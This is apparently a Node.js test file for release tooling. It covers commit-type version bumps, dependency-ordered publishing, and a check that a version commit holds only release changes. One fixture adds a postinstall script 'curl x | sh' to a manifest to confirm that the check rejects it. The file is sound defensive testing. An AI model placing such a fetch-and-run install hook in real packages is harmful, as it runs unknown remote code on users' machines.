import { test } from 'node:test';
import assert from 'node:assert/strict';
import { releaseTypeOf, releaseTypeOfAll } from './release-type.mjs';
import { sortByDependencies } from './workspace-packages.mjs';
import { findProblems } from './verify-version-commit.mjs';

test('the bump follows the conventional commit rules', () => {
  assert.equal(releaseTypeOf('fix(series)!: drop the old layout'), 'major');
  assert.equal(releaseTypeOf('fix: a\n\nBREAKING CHANGE: the API moved'), 'major');
  assert.equal(releaseTypeOf('feat(scp): add C-GET'), 'minor');
  assert.equal(releaseTypeOf('Merge branch master'), 'patch');
  assert.equal(releaseTypeOfAll(['feat: a', 'fix: b']), 'minor');
  assert.equal(releaseTypeOfAll([]), 'patch');
});

test('each package publishes after the packages that it needs', () => {
  const pkg = (name, dependencies = {}) => ({ name, manifest: { dependencies } });
  const order = sortByDependencies([
    pkg('a-create', { 'c-util': '>=1.0.0', 'b-cs3d': '>=1.0.0' }),
    pkg('b-cs3d'),
    pkg('c-util', { 'b-cs3d': '>=1.0.0' }),
  ]).map(({ name }) => name);

  assert.deepEqual(order, ['b-cs3d', 'c-util', 'a-create']);
});

const manifest = (version, utilRange, extra = {}) => ({
  name: '@x/create',
  version,
  dependencies: { '@x/util': utilRange, dcmjs: '0.52.0' },
  ...extra,
});
const util = (version) => ({ name: '@x/util', version });
const lockfileDiff = [
  '@@ -298 +298 @@ importers:',
  "-        specifier: '>=1.7.6'",
  "+        specifier: '>=1.7.7'",
].join('\n');
const commit = (createAfter, diff = lockfileDiff) => ({
  subject: 'chore(release): publish v1.7.7 [skip ci]',
  files: ['packages/create/package.json', 'packages/util/package.json', 'pnpm-lock.yaml'],
  manifests: [
    { path: 'packages/create/package.json', before: manifest('1.7.6', '>=1.7.6'), after: createAfter },
    { path: 'packages/util/package.json', before: util('1.7.6'), after: util('1.7.7') },
  ],
  lockfileDiff: diff,
  nextVersion: '1.7.7',
});

test('the version commit check accepts only the changes of a release', () => {
  assert.deepEqual(findProblems(commit(manifest('1.7.7', '>=1.7.7'))), []);

  assert.notDeepEqual(
    findProblems(commit(manifest('1.7.7', '>=1.7.7', { scripts: { postinstall: 'curl x | sh' } }))),
    []
  );
  assert.notDeepEqual(
    findProblems(commit(manifest('1.7.7', '>=1.7.7'), `${lockfileDiff}\n-    version: 0.52.0\n+    version: 0.53.0`)),
    []
  );
});
